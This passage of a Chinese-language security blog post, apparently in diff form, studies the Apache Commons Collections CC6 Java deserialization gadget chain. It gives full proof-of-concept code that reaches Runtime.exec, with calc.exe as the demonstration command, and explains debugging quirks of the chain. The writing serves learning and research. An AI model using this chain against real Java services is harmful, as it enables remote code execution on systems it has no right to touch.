class="literal">true</span>);</span><br><span class="line">            field.set(myLazyMap,payload);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 5. 模拟反序列化 * * * * * */</span></span><br><span class="line">            <span class="comment">// 序列化</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">            oos.writeObject(deserMap);</span><br><span class="line">            oos.close();</span><br><span class="line">            <span class="comment">// 反序列化</span></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="Q-为什么payload最后再加入"><a href="#Q-为什么payload最后再加入" class="headerlink" title="Q: 为什么payload最后再加入?"></a>Q: 为什么payload最后再加入?</h4><ol>
+<li><p>防止中途被调用的情况</p>
+</li>
+<li><p>p牛的处理方式</p>
+<ol>
+<li>对transformerChain的指向而不是直接LazyMap中的factory</li>
+<li><em><strong>很妙的思想</strong></em>: 既然factory是final，那我可以不改变他的指向，而是<strong>改变他指向的指向</strong></li>
+</ol>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">f.set(transformerChain, transformers);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>我的处理方式</p>
+<ol>
+<li>直接对属性进行设置，<em><strong>经过实验也是可以直接对<code>protected final</code>使用反射进行修改</strong></em></li>
+</ol>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectFinalTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> String myName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ReflectFinalTest</span><span class="params">()</span> &#123;</span><br><span class="line">        myName = <span class="string">&quot;KC1zs4&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        test();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ReflectFinalTest</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReflectFinalTest</span>();</span><br><span class="line">            System.out.println(obj.myName);</span><br><span class="line"></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> ReflectFinalTest.class;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;myName&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(obj, <span class="string">&quot;I&#x27;m not KC1zs4&quot;</span>);</span><br><span class="line"></span><br><span class="line">            System.out.println(obj.myName);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="Q-为什么会在field-set-myLazyMap-payload-也调用一次？总共调用两次？"><a href="#Q-为什么会在field-set-myLazyMap-payload-也调用一次？总共调用两次？" class="headerlink" title="Q: 为什么会在field.set(myLazyMap,payload)也调用一次？总共调用两次？"></a>Q: 为什么会在<code>field.set(myLazyMap,payload)</code>也调用一次？总共调用两次？</h4><ol>
+<li>Debug<ol>
+<li>debug的话就会触发，但是如果正常运行的话(把序列化和反序列化部分注释掉)则不会进行触发 –&gt; <strong>p牛的解决方法中也会有</strong></li>
+<li>判断：应该是debug触发了某种触发的方式</li>
+</ol>
+</li>
+</ol>
+<h4 id="Q-为什么myLazyMap-remove-key1-否则反序列化无法调用？"><a href="#Q-为什么myLazyMap-remove-key1-否则反序列化无法调用？" class="headerlink" title="Q: 为什么myLazyMap.remove(&quot;key1&quot;);否则反序列化无法调用？"></a>Q: 为什么<code>myLazyMap.remove(&quot;key1&quot;);</code>否则反序列化无法调用？</h4><blockquote>
+<p>本质上是保证<code>map.containsKey(key) == false</code></p>
+</blockquote>
+<ol>
+<li><p>注意到在LazyMap中要调用<code>transform()</code>的条件</p>
+<ol>
+<li>需要之前没有包含这一个key，如果调用过一次get(key)后，会进行一次put进去LazyMap中，LazyMap的put没有利用点 –&gt; <strong>这里通过调试可以发现的</strong></li>
+</ol>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>REASON</strong></p>
+<ol>
+<li>而在将tme放入hashMap中有一道工序是<code>put()</code>，在urldns中可知这里会先行对tme进行hashCode()，导致原本map中没有的key在还没序列化的put这一步就已经被放入LazyMap了</li>
+<li>那么后面再反序列化调用HashMap的readObejct再到调用链这里就没有触发<code>map.containsKey(key) == false</code>这一个点</li>
+</ol>
+</li>
+<li><p><strong>Solution</strong></p>
+<ol>
+<li>在put之后再把该(key, value)给remove掉<code>outerMap.remove(&quot;keykey&quot;)</code></li>
+</ol>
+</li>
+</ol>
+<h4 id="构造poc的一些注意点"><a href="#构造poc的一些注意点" class="headerlink" title="构造poc的一些注意点"></a>构造poc的一些注意点</h4><ol>
+<li><em><strong>还是要万全的链出来再写比较好(边写边想也可，就是不要急)，总之就是链要全</strong></em>，写的时候有一些模糊导致被卡到了</li>
+<li>不要被一环套一环给搞晕了，清除调用链就好<ol>
+<li>最底层使用HashMap是没有影响的</li>
+<li>本质上是通过Entry进行调用的，主要再Entry的链上进行</li>
+</ol>
+</li>
+</ol>
+<h3 id="CC6-poc-phith0n"><a href="#CC6-poc-phith0n" class="headerlink" title="CC6 poc phith0n"></a>CC6 poc phith0n</h3><ol>
+<li>浅浅分析一下</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6_p</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        String.class,</span><br><span class="line">                        Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        Object.class,</span><br><span class="line">                        Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span></span><br><span class="line">                        <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class</span><br><span class="line">                &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 不再使⽤原CommonsCollections6中的HashSet，直接使⽤HashMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">        outerMap.remove(<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span></span><br><span class="line">                ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ==================</span></span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 本地测试触发</span></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结一下-从CC1-TransformedMap到CC1-LazyMap再到CC6"><a href="#总结一下-从CC1-TransformedMap到CC1-LazyMap再到CC6" class="headerlink" title="总结一下: 从CC1_TransformedMap到CC1_LazyMap再到CC6"></a>总结一下: 从CC1_TransformedMap到CC1_LazyMap再到CC6</h2><blockquote>
+<p>不止要理解原理，还要理解探索的过程，这样才可以自己探索嘛</p>
+</blockquote>
+<ol>
+<li>在链中要有一个利用点</li>
+<li>对于利用点的各个判断条件都需要进行满足</li>
+<li>链的利用<strong>要对那些类比较熟悉</strong>，多看就好了，能一次就记住也是强(多总结)</li>
+</ol>
+<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol>
+<li>java安全漫谈12</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5DCommonsCollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0.md">信工所大佬</a> –&gt; 比较多基于cc5的</li>
+</ol>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84CC%E9%93%BE%E5%88%A9%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88-CC6"><span class="toc-number">1.</span> <span class="toc-text">高版本的CC链利用解决方案:CC6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC6%E6%9E%84%E9%80%A0%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">CC6构造分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadget-Chain"><span class="toc-number">2.1.</span> <span class="toc-text">Gadget Chain</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#org-apache-commons-collections-keyvalue-TiedMapEntry"><span class="toc-number">2.2.</span> <span class="toc-text">org.apache.commons.collections.keyvalue.TiedMapEntry</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFMap-Entry"><span class="toc-number">2.3.</span> <span class="toc-text">什么是Map.Entry?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E7%9A%84CC6"><span class="toc-number">2.4.</span> <span class="toc-text">我的CC6</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CC6-poc-KC1zs4"><span class="toc-number">2.4.1.</span> <span class="toc-text">CC6 poc KC1zs4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Q-%E4%B8%BA%E4%BB%80%E4%B9%88payload%E6%9C%80%E5%90%8E%E5%86%8D%E5%8A%A0%E5%85%A5"><span class="toc-number">2.4.2.</span> <span class="toc-text">Q: 为什么payload最后再加入?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Q-%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E5%9C%A8field-set-myLazyMap-payload-%E4%B9%9F%E8%B0%83%E7%94%A8%E4%B8%80%E6%AC%A1%EF%BC%9F%E6%80%BB%E5%85%B1%E8%B0%83%E7%94%A8%E4%B8%A4%E6%AC%A1%EF%BC%9F"><span class="toc-number">2.4.3.</span> <span class="toc-text">Q: 为什么会在field.set(myLazyMap,payload)也调用一次？总共调用两次？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Q-%E4%B8%BA%E4%BB%80%E4%B9%88myLazyMap-remove-key1-%E5%90%A6%E5%88%99%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%97%A0%E6%B3%95%E8%B0%83%E7%94%A8%EF%BC%9F"><span class="toc-number">2.4.4.</span> <span class="toc-text">Q: 为什么myLazyMap.remove(&quot;key1&quot;);否则反序列化无法调用？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0poc%E7%9A%84%E4%B8%80%E4%BA%9B%E6%B3%A8%E6%84%8F%E7%82%B9"><span class="toc-number">2.4.5.</span> <span class="toc-text">构造poc的一些注意点</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CC6-poc-phith0n"><span class="toc-number">2.5.</span> <span class="toc-text">CC6 poc phith0n</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B-%E4%BB%8ECC1-TransformedMap%E5%88%B0CC1-LazyMap%E5%86%8D%E5%88%B0CC6"><span class="toc-number">3.</span> <span class="toc-text">总结一下: 从CC1_TransformedMap到CC1_LazyMap再到CC6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ref"><span class="toc-number">4.</span> <span class="toc-text">Ref</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2024/11/17/Java%E5%AE%89%E5%85%A85(5)_CC6/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2024/11/17/Java%E5%AE%89%E5%85%A85(5)_CC6/&text=Java安全5(5)_CC6"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2024/11/17/Java%E5%AE%89%E5%85%A85(5)_CC6/&title=Java安全5(5)_CC6"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2024/11/17/Java%E5%AE%89%E5%85%A85(5)_CC6/&is_video=false&description=Java安全5(5)_CC6"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java安全5(5)_CC6&body=Check out this article: https://kc1zs4.github.io/2024/11/17/Java%E5%AE%89%E5%85%A85(5)_CC6/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2024/11/17/Java%E5%AE%89%E5%85%A85(5)_CC6/&title=Java安全5(5)_CC6"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2024/11/17/Java%E5%AE%89%E5%85%A85(5)_CC6/&title=Java安全5(5)_CC6"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2024/11/17/Java%E5%AE%89%E5%85%A85(5)_CC6/&title=Java安全5(5)_CC6"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2024/11/17/Java%E5%AE%89%E5%85%A85(5)_CC6/&title=Java安全5(5)_CC6"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2024/11/17/Java%E5%AE%89%E5%85%A85(5)_CC6/&name=Java安全5(5)_CC6&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2024/11/17/Java%E5%AE%89%E5%85%A85(5)_CC6/&t=Java安全5(5)_CC6"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    KC1zs4&#39;s Blog
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+  
+<script src="/js/search.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+
+    var $inputArea = $("input#search-input");
+    var $resultArea = document.querySelector("div#search-result");
+
+    $inputArea.focus(function() {
+      var search_path = "search.xml";
+      if (search_path.length == 0) {
+        search_path = "search.xml";
+      }
+      var path = "/" + search_path;
+      searchFunc(path, 'search-input', 'search-result');
+    });
+
+    $inputArea.keydown(function(e) {
+      if (e.which == 13) {
+        e.preventDefault();
+      }
+    });
+
+    var observer = new MutationObserver(function(mutationsList, observer) {
+      if (mutationsList.length == 1) {
+        if (mutationsList[0].addedNodes.length) {
+          $(".search-no-result").hide();
+        } else if (mutationsList[0].removedNodes.length) {
+          $(".search-no-result").show(200);
+        }
+      }
+    });
+
+    observer.observe($resultArea, { childList: true });
+
+  });
+  </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
